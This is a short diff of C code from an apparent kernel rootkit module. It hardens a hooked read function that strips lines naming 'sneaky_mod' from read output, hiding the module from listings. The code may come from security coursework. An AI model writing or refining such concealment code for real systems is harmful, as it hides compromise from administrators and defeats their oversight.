@@ -141,11 +141,11 @@ ssize_t sneaky_read(int fd, void *buf, size_t count) {
   // try to locate "sneaky_mod" in the read result
   if (read_size >= 1) {
     char* ptr;
-    ptr = strstr(buf, "sneaky_mod");
+    ptr = strnstr(buf, "sneaky_mod", read_size);
 
     if (ptr != NULL) { // if found: skip it
       char* ptr_nl;
-      ptr_nl = strstr(ptr, "\n");  // find that whole line about the "sneaky_mod"
+      ptr_nl = strnstr(ptr, "\n", read_size - (int)((void*)ptr - buf));  // find that whole line about the "sneaky_mod"
       if (ptr_nl != NULL) {
 	int size_after_line;
 	int size_of_line;
